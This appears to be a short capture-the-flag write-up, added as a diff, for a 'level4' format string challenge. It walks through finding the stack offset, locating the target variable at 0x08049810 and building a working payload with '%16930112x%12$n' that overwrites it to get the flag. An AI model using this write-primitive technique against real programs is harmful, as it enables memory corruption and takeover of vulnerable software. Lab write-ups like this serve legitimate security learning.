@@ -1,0 +1,25 @@
+this one is also a format string exploit, the code is pretty much the same as
+the level 3 but insted of a small value we have to match with a big one, in a
+variable again
+
+in order to do this we're going to use %n again and this time the format of %x
+
+lets find the offset, where do we find our strings ?
+
+python -c 'print "AAAA" + "%x" *40'
+
+seems to be the 12th
+
+lets get the address of the variable : info variables
+
+0x08049810  m
+
+ok so "\x10\x98\x04\x08" and what do we need to put in it ?
+
+cmp    eax,0x1025544 = 16930116
+
+we already wrote a 4 bit addr so 16930112 at the 12th spot
+
+python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"' | ./level4
+
+well done, we have the flag :]
